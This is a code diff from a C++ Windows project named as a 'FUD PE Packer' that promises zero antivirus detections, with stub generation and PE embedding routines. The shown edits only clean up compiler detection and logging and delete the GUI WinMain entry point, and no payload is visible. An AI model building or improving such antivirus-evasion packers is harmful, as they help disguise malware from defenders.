@@ -1679,7 +1679,7 @@ public:
             
             debugLog << "Source file written successfully\n";
             
-            // Improved compiler detection and command building
+            // Use smart compiler detection for robust compilation
             auto compilerInfo = CompilerDetector::detectVisualStudio();
             
             // Build compilation command with architecture support
@@ -1687,12 +1687,9 @@ public:
             
             std::string compileCmd;
             
-            // Use smart compiler detection for robust compilation
-            auto compilerInfo = CompilerDetector::detectVisualStudio();
-            
             if (!compilerInfo.found) {
-                debugLog << "ERROR: Visual Studio compiler not found!\n";
-                debugLog.close();
+                std::ofstream errorLog("debug_stub_generation.txt", std::ios::app); errorLog << "ERROR: Visual Studio compiler not found!\n";
+                errorLog.close();
                 return false;
             }
             
@@ -1824,12 +1821,9 @@ public:
             
             std::string compileCmd;
             
-            // Use smart compiler detection for robust compilation
-            auto compilerInfo = CompilerDetector::detectVisualStudio();
-            
             if (!compilerInfo.found) {
-                debugLog << "ERROR: Visual Studio compiler not found!\n";
-                debugLog.close();
+                std::ofstream errorLog2("debug_pe_embedding.txt", std::ios::app); errorLog2 << "ERROR: Visual Studio compiler not found!\n";
+                errorLog2.close();
                 return false;
             }
             
@@ -2903,49 +2897,6 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
     return 0;
 }
 
-int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
-    // Initialize common controls
-    INITCOMMONCONTROLSEX icex;
-    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
-    icex.dwICC = ICC_PROGRESS_CLASS | ICC_STANDARD_CLASSES;
-    InitCommonControlsEx(&icex);
-    
-    const wchar_t CLASS_NAME[] = L"UltimateStealthPackerWindow";
-    
-    WNDCLASSW wc = {};
-    wc.lpfnWndProc = WindowProc;
-    wc.hInstance = hInstance;
-    wc.lpszClassName = CLASS_NAME;
-    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
-    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
-    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
-    
-    RegisterClassW(&wc);
-    
-    HWND hwnd = CreateWindowExW(
-        0,
-        CLASS_NAME,
-        L"Ultimate FUD PE Packer v3.0 - Guaranteed 0/72 Detections",
-        WS_OVERLAPPEDWINDOW,
-        CW_USEDEFAULT, CW_USEDEFAULT, 520, 500,
-        NULL, NULL, hInstance, NULL
-    );
-    
-    if (hwnd == NULL) {
-        return 0;
-    }
-    
-    ShowWindow(hwnd, nCmdShow);
-    UpdateWindow(hwnd);
-    
-    MSG msg = {};
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    
-    return 0;
-}
 
 // NEW: Automated FUD Testing & Validation System
 class AutoFUDTester {
